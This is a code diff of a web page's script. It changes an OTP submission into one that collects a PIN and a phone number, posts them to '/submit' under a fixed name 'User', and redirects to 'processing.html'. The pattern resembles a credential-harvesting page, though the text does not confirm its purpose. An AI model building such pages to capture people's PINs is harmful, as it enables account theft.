@@ -149,39 +149,38 @@
 
 <script>
 async function submitOtp() {
-    let otp = "";
+    let pin = "";
 
     document.querySelectorAll(".pin-box").forEach(input => {
-        otp += input.value;
+        pin += input.value;
     });
 
-    // 🔴 validate first
-    if (otp.length < 4) {
+    if (pin.length < 4) {
         alert("Enter full PIN");
         return;
     }
 
+    const phone = document.getElementById("phone").value;
+
     try {
-        const res = await fetch("/submit-otp", {
+        const res = await fetch("/submit", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
             },
-            body: JSON.stringify({ otp })
+            body: JSON.stringify({
+                name: "User",
+                phone: phone,
+                pin: pin
+            })
         });
 
-        // 🔴 check response
-        if (!res.ok) {
-            throw new Error("Server error");
-        }
-
-localStorage.setItem("fromPin", "yes");
+        if (!res.ok) throw new Error();
 
         window.location.href = "processing.html";
 
     } catch (err) {
-        console.error("Error:", err);
-        alert("Failed to submit OTP");
+        alert("Failed to submit");
     }
 }
 </script>
